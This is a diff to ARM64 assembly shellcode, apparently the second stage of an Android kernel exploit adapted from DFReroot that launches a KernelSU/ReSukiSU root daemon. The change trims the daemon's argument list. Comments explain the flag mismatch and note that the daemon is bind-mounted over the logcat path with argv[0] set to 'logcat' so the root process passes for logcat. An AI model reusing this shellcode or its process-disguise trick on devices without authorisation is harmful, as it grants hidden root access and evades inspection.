@@ -203,16 +203,31 @@ msg_s2_fail:
     .asciz "s2: stage2 failed. exit."
 .endif
 
+// The command line the staged daemon is exec'd with, and it is only what that daemon's own clap
+// definition declares: `late-load [--allow-shell] [--kmi KMI] [--package-name PACKAGE_NAME]`.
+//
+// DFReroot's argv is not ours to keep. Its shellcode passed
+// `late-load --package-name me.weishu.kernelsu --stage-from <path>`, and both of those strings
+// belong to the KernelSU fork its daemon was built from - the daemon it stages understands
+// --stage-from, and its manager is the one at me.weishu.kernelsu. Ours stages a ReSukiSU/Next
+// build, whose late-load takes neither: it answers
+//
+//     error: unexpected argument '--stage-from' found
+//     Usage: ksud late-load --package-name <PACKAGE_NAME>
+//
+// and exits at argument parsing, before loading anything. The exploit still reported success,
+// because its success marker only says the daemon was exec'd - so the run looked done and left a
+// phone with no su on it. Nothing is passed at all now:
+//
+// - --stage-from is not a flag this daemon has. It stages itself by renaming
+//   /data/local/tmp/.ksud-stage into /data/adb/ksud, a path compiled into its own code.
+// - --package-name has a default built from the flavour the binary was compiled for, which is the
+//   same flavour the app chooses when it stages this file. Naming one here would be a second
+//   opinion, compiled in, that no test could keep true across flavours.
 argv_prog:
     .asciz "logcat"
 argv_late:
     .asciz "late-load"
-argv_pkgname:
-    .asciz "--package-name"
-argv_ksu:
-    .asciz "me.weishu.kernelsu"
-argv_stage_from:
-    .asciz "--stage-from"
 timespec_req:
     .quad 1          /* tv_sec */
     .quad 0          /* tv_nsec */
@@ -307,27 +322,18 @@ matched:
 
     logdbg msg_s2_bind, logdw_path2, log_tag2
 
-    // argv = [logcat, late-load, --package-name,
-    //         me.weishu.kernelsu, --stage-from, ksud_path, NULL]
+    // argv = [logcat, late-load, NULL]
+    //
+    // argv[0] is logcat rather than the daemon's name because this is the path the daemon is
+    // bind-mounted over: the process is a logcat to everything that looks at it, which is the same
+    // reason the bind mount exists.
     adr x0, argv_prog
     str x0, [sp]
 
     adr x0, argv_late
     str x0, [sp, 8]
 
-    adr x0, argv_pkgname
-    str x0, [sp, 16]
-
-    adr x0, argv_ksu
-    str x0, [sp, 24]
-
-    adr x0, argv_stage_from
-    str x0, [sp, 32]
-
-    adr x0, ksud_path
-    str x0, [sp, 40]
-
-    str xzr, [sp, 48]
+    str xzr, [sp, 16]
 
     adr x0, logcat_path
     mov x1, sp
